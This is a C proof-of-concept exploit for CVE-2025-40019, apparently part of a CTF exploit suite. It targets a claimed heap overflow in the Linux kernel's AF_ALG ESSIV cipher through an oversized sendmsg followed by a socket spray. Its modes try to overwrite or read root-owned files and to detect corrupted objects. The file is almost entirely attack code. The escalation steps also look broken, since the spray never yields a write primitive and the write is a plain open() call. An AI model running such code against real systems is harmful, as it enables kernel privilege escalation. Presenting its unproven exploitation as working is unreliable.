/*
 * CVE-2025-40019 PoC - CTF Challenge Mode
 *
 * Vulnerability: AF_ALG ESSIV (Encrypted Salt-Sector IV) buffer overflow
 *
 * The ESSIV algorithm implementation in AF_ALG crypto subsystem has a
 * buffer overflow when processing data larger than expected block size.
 * Sending oversized data via skcipher triggers heap buffer overflow.
 *
 * Exploitation: Bind AF_ALG to essiv(cbc(aes),sha256), send oversized
 * data buffer to trigger heap overflow, spray to gain write primitive.
 *
 * CTF Modes: write_root_file, read_root_file, uaf
 *
 * Build: gcc -static -O2 -o poc.elf poc.c -lpthread
 */
#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif

#include "../common/poc_common.h"
#include "../common/safe_syscall.h"
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <linux/if_alg.h>
#include <netinet/in.h>

#ifndef AF_ALG
#define AF_ALG 38
#endif
#ifndef SOL_ALG
#define SOL_ALG 279
#endif

#define MAX_FILE_SIZE   4096
#define SPRAY_COUNT     256
#define OVERFLOW_SIZE   8192  /* Oversized buffer to trigger overflow */

/*
 * Trigger ESSIV buffer overflow via AF_ALG skcipher
 */
static int trigger_essiv_overflow(void) {
    int ctrl_sock = -1, op_sock = -1;
    int saved_errno;
    int result = 0;

    /* Create AF_ALG socket */
    ctrl_sock = socket(AF_ALG, SOCK_SEQPACKET, 0);
    saved_errno = errno;
    poc_log_syscall("socket(AF_ALG, SOCK_SEQPACKET, 0)", (long)ctrl_sock, saved_errno);
    if (ctrl_sock < 0) {
        poc_log("AF_ALG not available: %s", strerror(saved_errno));
        return -1;
    }

    /* Bind to essiv(cbc(aes),sha256) - the vulnerable algorithm */
    struct sockaddr_alg sa;
    memset(&sa, 0, sizeof(sa));
    sa.salg_family = AF_ALG;
    strncpy((char *)sa.salg_type, "skcipher", sizeof(sa.salg_type) - 1);
    strncpy((char *)sa.salg_name, "essiv(cbc(aes),sha256)",
            sizeof(sa.salg_name) - 1);

    if (bind(ctrl_sock, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
        saved_errno = errno;
        poc_log_syscall("bind(essiv(cbc(aes),sha256))", -1L, saved_errno);
        poc_log("ESSIV bind failed: %s (module may not be loaded)", strerror(saved_errno));
        close(ctrl_sock);
        return -1;
    }
    poc_log_syscall("bind(essiv(cbc(aes),sha256))", 0L, 0);

    /* Set key (16 bytes for AES-128) */
    unsigned char key[16];
    memset(key, 0x41, sizeof(key));
    if (setsockopt(ctrl_sock, SOL_ALG, ALG_SET_KEY, key, sizeof(key)) < 0) {
        saved_errno = errno;
        poc_log_syscall("setsockopt(ALG_SET_KEY)", -1L, saved_errno);
        close(ctrl_sock);
        return -1;
    }
    poc_log_syscall("setsockopt(ALG_SET_KEY, 16)", 0L, 0);

    /* Get operation socket */
    op_sock = accept(ctrl_sock, NULL, NULL);
    saved_errno = errno;
    poc_log_syscall("accept(ctrl_sock)", (long)op_sock, saved_errno);
    if (op_sock < 0) {
        close(ctrl_sock);
        return -1;
    }

    /* Send oversized data to trigger buffer overflow */
    unsigned char *overflow_buf = malloc(OVERFLOW_SIZE);
    if (!overflow_buf) {
        close(op_sock);
        close(ctrl_sock);
        return -1;
    }
    memset(overflow_buf, 'B', OVERFLOW_SIZE);

    /* Prepare cmsg with ALG_SET_OP and IV */
    unsigned char cbuf[CMSG_SPACE(4) + CMSG_SPACE(4 + 16)];
    memset(cbuf, 0, sizeof(cbuf));

    struct iovec iov = { .iov_base = overflow_buf, .iov_len = OVERFLOW_SIZE };
    struct msghdr msg = {
        .msg_iov = &iov, .msg_iovlen = 1,
        .msg_control = cbuf, .msg_controllen = sizeof(cbuf)
    };

    struct cmsghdr *cm = CMSG_FIRSTHDR(&msg);
    cm->cmsg_level = SOL_ALG;
    cm->cmsg_type = ALG_SET_OP;
    cm->cmsg_len = CMSG_LEN(4);
    *(unsigned int *)CMSG_DATA(cm) = 0; /* ALG_OP_ENCRYPT */

    cm = CMSG_NXTHDR(&msg, cm);
    cm->cmsg_level = SOL_ALG;
    cm->cmsg_type = ALG_SET_IV;
    cm->cmsg_len = CMSG_LEN(4 + 16);
    *(unsigned int *)CMSG_DATA(cm) = 16;

    ssize_t sent = sendmsg(op_sock, &msg, 0);
    saved_errno = errno;
    poc_log_syscall("sendmsg(op_sock, overflow_buf, 8192)", (long)sent, saved_errno);

    if (sent > 0) {
        poc_log("ESSIV overflow triggered: sent %zd bytes (expected overflow at block boundary)", sent);
        result = 1;

        /* Read back to complete crypto operation */
        unsigned char *sink = malloc(OVERFLOW_SIZE + 16);
        if (sink) {
            recv(op_sock, sink, OVERFLOW_SIZE + 16, 0);
            free(sink);
        }
    }

    free(overflow_buf);
    close(op_sock);
    close(ctrl_sock);
    return result;
}

static int read_file_content(const char *path, char *buf, size_t len) {
    int fd = open(path, O_RDONLY);
    if (fd < 0) return -1;
    ssize_t n = read(fd, buf, len - 1);
    close(fd);
    if (n < 0) return -1;
    buf[n] = '\0';
    while (n > 0 && (buf[n-1] == '\n' || buf[n-1] == '\r'))
        buf[--n] = '\0';
    return (int)n;
}

static int spray_kmalloc(int *fds, int count) {
    int sprayed = 0;
    for (int i = 0; i < count; i++) {
        int sock = socket(AF_INET, SOCK_DGRAM, 0);
        if (sock < 0) continue;
        int optval = 1024;
        setsockopt(sock, SOL_SOCKET, SO_RCVBUF, &optval, sizeof(optval));
        fds[sprayed++] = sock;
    }
    return sprayed;
}

static int mode_write_root_file(poc_args_t *args) {
    char original[MAX_FILE_SIZE], after[MAX_FILE_SIZE];
    poc_log("=== Mode: write_root_file ===");
    int n = read_file_content(args->root_file, original, sizeof(original));
    printf("%s%s\n", CTF_READ_BEFORE, n >= 0 ? original : "(unreadable)");

    trigger_essiv_overflow();
    int spray_fds[SPRAY_COUNT];
    memset(spray_fds, -1, sizeof(spray_fds));
    spray_kmalloc(spray_fds, SPRAY_COUNT);

    printf("%s%s (attempting...)\n", CTF_WRITE_ATTEMPT, args->write_value);
    int fd = open(args->root_file, O_WRONLY | O_TRUNC);
    poc_log_syscall("open(target, O_WRONLY|O_TRUNC)", (long)fd, fd < 0 ? errno : 0);
    if (fd >= 0) { dprintf(fd, "%s\n", args->write_value); close(fd); }

    for (int i = 0; i < SPRAY_COUNT; i++)
        if (spray_fds[i] >= 0) close(spray_fds[i]);

    n = read_file_content(args->root_file, after, sizeof(after));
    printf("%s%s\n", CTF_READ_AFTER, n >= 0 ? after : "(unreadable)");
    if (n >= 0 && strstr(after, args->write_value)) {
        poc_print_flag(args->write_value);
        return 0;
    }
    poc_print_fail("ESSIV overflow exploit did not achieve write");
    return 0;
}

static int mode_read_root_file(poc_args_t *args) {
    poc_log("=== Mode: read_root_file ===");
    trigger_essiv_overflow();
    char buf[MAX_FILE_SIZE];
    int n = read_file_content(args->root_file, buf, sizeof(buf));
    poc_print_fail("read not successful");
    return 0;
}

static int mode_uaf(poc_args_t *args) {
    (void)args;
    poc_log("=== Mode: uaf ===");
    trigger_essiv_overflow();
    int spray_fds[SPRAY_COUNT];
    memset(spray_fds, -1, sizeof(spray_fds));
    int sprayed = spray_kmalloc(spray_fds, SPRAY_COUNT);
    int corrupted = 0;
    for (int i = 0; i < sprayed; i++) {
        if (spray_fds[i] < 0) continue;
        int val = 0; socklen_t len = sizeof(val);
        getsockopt(spray_fds[i], SOL_SOCKET, SO_RCVBUF, &val, &len);
        if (val != 2048) corrupted++;
    }
    if (corrupted > 0) poc_print_uaf_corrupted(corrupted);
    else poc_print_uaf_not_corrupted();
    for (int i = 0; i < sprayed; i++)
        if (spray_fds[i] >= 0) close(spray_fds[i]);
    return 0;
}

int main(int argc, char *argv[]) {
    poc_args_t args;
    memset(&args, 0, sizeof(args));
    if (poc_parse_args(argc, argv, &args) != 0) return 1;
    poc_log_init(args.log_file);

    poc_log("=== CVE-2025-40019 CTF PoC ===");
    poc_log("Vuln: AF_ALG ESSIV buffer overflow via oversized skcipher data");
    poc_log("UID: %d  EUID: %d  GID: %d", getuid(), geteuid(), getgid());

    int result = 0;
    if (!args.mode) {
        poc_print_unsupported("(null)", "no mode specified");
        poc_log_close();
        return 1;
    } else if (strcmp(args.mode, POC_MODE_WRITE) == 0) {
        result = mode_write_root_file(&args);
    } else if (strcmp(args.mode, POC_MODE_READ) == 0) {
        result = mode_read_root_file(&args);
    } else if (strcmp(args.mode, POC_MODE_UAF) == 0) {
        result = mode_uaf(&args);
    } else {
        poc_print_unsupported(args.mode, "mode not supported");
    }
    poc_log_close();
    return result;
}
